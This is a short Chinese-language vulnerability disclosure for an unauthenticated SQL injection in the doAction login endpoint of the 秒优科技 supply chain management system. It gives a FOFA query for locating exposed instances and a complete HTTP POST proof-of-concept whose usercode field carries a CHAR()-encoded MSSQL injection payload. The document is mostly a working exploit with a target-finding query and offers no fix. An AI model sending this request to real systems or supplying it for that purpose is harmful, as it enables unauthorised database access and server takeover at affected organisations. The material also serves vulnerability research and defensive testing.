# 秒优科技-供应链管理系统doAction存在SQL注入漏洞

由于秒优科技-供应链管理系统 doAction 接口未对用户传入的参数进行合理的校验和过滤，导致传入的参数直接携带到数据库执行，导致SQL注入漏洞，未经身份验证的攻击者可通过此漏洞获取数据库权限，深入利用可获取服务器权限。

## fofa
```javascript
app="秒优科技-供应链管理系统"
```

## poc
```javascript
POST /zh/login/doAction HTTP/1.1
Host: 
X-Requested-With: XMLHttpRequest
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0
Priority: u=0

{"usercode":"1'+(SELECT CHAR(83)+CHAR(87)+CHAR(119)+CHAR(105) WHERE 6635=6635 AND 2366 IN (SELECT (CHAR(113)+CHAR(98)+CHAR(98)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (2366=2366) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(120)+CHAR(107)+CHAR(106)+CHAR(113))))+'","password":"1","remember":false,"ip":null,"city":null,"ISERP":"ISERP"}
```

![image-20241219151645423](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202412191516482.png)